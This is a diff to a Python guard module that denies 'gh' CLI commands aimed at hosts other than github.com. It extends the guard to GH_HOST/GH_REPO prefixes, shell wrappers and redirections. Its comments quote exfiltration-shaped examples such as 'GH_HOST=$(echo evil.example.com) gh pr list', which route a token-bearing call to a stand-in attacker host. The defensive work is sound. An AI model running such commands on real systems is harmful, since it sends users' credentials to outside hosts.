@@ -10,7 +10,9 @@ other than github.com, through its own arguments — no write verb needed:
     positional URL that names one, or a ``HOST/OWNER/REPO`` positional of a verb that
     takes a repository (``gh repo view|clone|fork ...``), sends the request (and any
     ``--search`` text) there;
-  - ``--web`` / ``-w`` opens a URL at that host.
+  - ``--web`` / ``-w`` opens a URL at that host;
+  - a ``GH_HOST=`` / ``GH_REPO=`` assignment in front of the call (bare or behind ``env`` and the
+    other wrappers) selects the host the way ``--hostname`` / ``-R`` do.
 
 Two calls of one granted read verb thus suffice to carry an environment-resident token
 off the box. This module answers ``allow`` or ``deny <reason>`` for a whole command
@@ -22,6 +24,8 @@ refuses only the shapes above; every other ``gh`` call — including the fleet's
 text, so a value the shell assembles at run time (a variable, a ``$'...'`` form) is
 invisible to it; those are the hook's approver's to gate, not the decider's (the approver
 does not approve a gh command in which an expansion can form or change an option word).
+That includes a command substitution inside a ``GH_HOST=`` / ``GH_REPO=`` prefix value:
+``GH_HOST=$(echo evil.example.com) gh pr list`` is read as the literal text.
 """
 
 from __future__ import annotations
@@ -56,6 +60,10 @@ _WRAPPERS = {
     "env",
     "xargs",
     "timeout",
+    "noglob",
+    "nocorrect",
+    "coproc",
+    "repeat",
     "do",
     "then",
     "else",
@@ -311,13 +319,47 @@ def _is_separator(tok: str) -> bool:
     return bool(tok) and all(ch in _SEPARATOR_CHARS for ch in tok)
 
 
+# A host nothing allows. A subscripted `GH_HOST[i]=` / `GH_REPO[i]=` prefix means different strings in bash
+# (an array element) and zsh (an edit of the string), so the guard reads it as this.
+_UNKNOWN_HOST = "unknown-host.invalid"
+_MAX_READINGS = 16
+
+# The descriptor in front of a redirection operator: `2` in `2>&1`, `{fd}` in `{fd}>file`.
+_FD_WORD = re.compile(r"[0-9]+|\{[A-Za-z_][A-Za-z0-9_]*\}")
+
+
+def _is_redirect(tok: str) -> bool:
+    """A redirection operator token: ``>``, ``>>``, ``<``, ``<<<``, ``>&``, ``&>``, ``>|``. The lexer
+    splits it from its target, which is the next token."""
+    return bool(tok) and set(tok) <= set("<>&|") and ("<" in tok or ">" in tok)
+
+
+_SEP_THEN_REDIRECT = re.compile(r"([;&|()`\n]+)([<>][<>&|]*)")
+# `&>file` redirects both streams (zsh adds the clobber forms); the shell does not read it as a `&` separator
+# followed by `>`. Splitting it would end the gh segment there and hide every later flag from the inspection.
+_AMP_REDIRECTS = ("&>", "&>>", "&>|", "&>>|")
+
+
+def _split_sep_redirect(tokens: list[str]) -> list[str]:
+    """The lexer fuses adjacent punctuation, so ``;>f`` is one token that is neither a separator nor a
+    redirection. Split a separator run from the redirection operator after it."""
+    out: list[str] = []
+    for tok in tokens:
+        if tok in _AMP_REDIRECTS:
+            out.append(tok)
+            continue
+        m = _SEP_THEN_REDIRECT.fullmatch(tok) if "<" in tok or ">" in tok else None
+        out.extend(m.groups() if m else [tok])
+    return out
+
+
 def _gh_command_words(tokens: list[str]) -> list[list[str]]:
     """Split a token stream on shell operators into segments, and return the argument
     lists of the segments whose command word is ``gh`` (bare, ``\\gh``, wrapped, or a
     path ending in ``gh``)."""
     segments: list[list[str]] = []
     current: list[str] = []
-    for tok in tokens:
+    for tok in _split_sep_redirect(tokens):
         if _is_separator(tok):
             segments.append(current)
             current = []
@@ -328,18 +370,45 @@ def _gh_command_words(tokens: list[str]) -> list[list[str]]:
     out: list[list[str]] = []
     for seg in segments:
         i = 0
-        host_env = None  # a GH_HOST=<host> prefix names the host this gh call talks to
+        # GH_HOST=<host> / GH_REPO=[HOST/]OWNER/REPO prefixes name the host this call talks to. `held` is what
+        # each holds if `+=` appends; `readings` is every value a prefix gave it, and any foreign one denies.
+        held: dict[str, str] = {}
+        readings: dict[str, list[str]] = {}
         while i < len(seg):
             t = seg[i]
-            m = re.fullmatch(r"([A-Za-z_][A-Za-z0-9_]*)=(.*)", t)
-            if m:
-                if m.group(1) == "GH_HOST":
-                    host_env = m.group(2)
+            # a redirection before the command word (`2>&1 gh ...`, `>/dev/null gh ...`) is opened by
+            # the shell, which then runs the call: skip the operator and its target
+            if _is_redirect(t):
+                i += 2
+                continue
+            if _FD_WORD.fullmatch(t) and i + 1 < len(seg) and _is_redirect(seg[i + 1]):
+                i += 1
+                continue
+            # NAME=, NAME+= and NAME[i]= (bash runs a call behind any of them) are assignment prefixes; a
+            # token that opens with `]=` is the tail of a subscript the lexer split at a `$(`
+            m = re.fullmatch(r"([A-Za-z_][A-Za-z0-9_]*)(\[[^\]]*\])?(\+?)=(.*)", t, re.S)
+            if m or re.fullmatch(r"\]\+?=.*", t, re.S):
+                if m and m.group(1) in ("GH_HOST", "GH_REPO"):
+                    name, subscript, plus, value = m.groups()
+                    seen = readings.setdefault(name, [])
+                    if len(seen) >= _MAX_READINGS:
+                        # more prefixes of one name than any real call carries: a doubt denies, and the
+                        # work stays linear however long the flood is
+                        seen[:] = [_UNKNOWN_HOST if name == "GH_HOST" else f"{_UNKNOWN_HOST}/o/r"]
+                        held[name] = ""
+                    elif subscript:
+                        seen.append(_UNKNOWN_HOST if name == "GH_HOST" else f"{_UNKNOWN_HOST}/o/r")
+                    else:
+                        # `+=` appends to what an earlier prefix set (`GH_HOST=evil GH_HOST+=x` is still evil).
+                        # A later prefix never launders an earlier one, whichever way a shell resolves them
+                        # (bash 3.2 assigns where zsh appends): every earlier reading stays.
+                        held[name] = held.get(name, "") + value if plus else value
+                        seen.append(held[name])
                 i += 1
                 continue
             base = t.lstrip("\\")
             if base in _WRAPPERS:
-                i += 1
+                i += 2 if base == "repeat" else 1  # zsh `repeat` takes a count word: `repeat $n gh ...`
                 while i < len(seg) and (
                     seg[i].startswith("-") or re.fullmatch(r"[0-9]+[smhd]?", seg[i])
                 ):
@@ -348,7 +417,11 @@ def _gh_command_words(tokens: list[str]) -> list[list[str]]:
             break
         if i < len(seg) and seg[i].lstrip("\\").rsplit("/", 1)[-1] == "gh":
             args = seg[i + 1 :]
-            out.append(args + ["--hostname", host_env] if host_env else args)
+            for name, flag in (("GH_HOST", "--hostname"), ("GH_REPO", "-R")):
+                for value in readings.get(name, []):
+                    if value:
+                        args = args + [flag, value]
+            out.append(args)
     return out
 
 
@@ -440,7 +513,7 @@ def _inspect_gh_args(args: list[str], allowed: set[str]) -> str | None:
                 else _host_of(repo)
             )
             if _foreign(host, allowed):
-                return "gh -R/--repo/--hostname names a host other than github.com"
+                return "gh -R/--repo/--hostname/GH_HOST/GH_REPO names a host other than github.com"
             i += 1
             continue
 
@@ -471,7 +544,14 @@ def decide(command: str, *, gh_host: str = "") -> tuple[str, str]:
 
 
 def main(argv: list[str]) -> int:
-    command = argv[1] if len(argv) > 1 else sys.stdin.read()
+    # stdin as bytes: a text-mode read is strict in the locale's encoding and raises on a byte it
+    # cannot decode, which the hook reads as "did not answer" and fails open. argv got
+    # surrogateescape; so does this.
+    command = (
+        argv[1]
+        if len(argv) > 1
+        else sys.stdin.buffer.read().decode("utf-8", "surrogateescape")
+    )
     import os
 
     verdict, reason = decide(command, gh_host=os.environ.get("GH_HOST", ""))
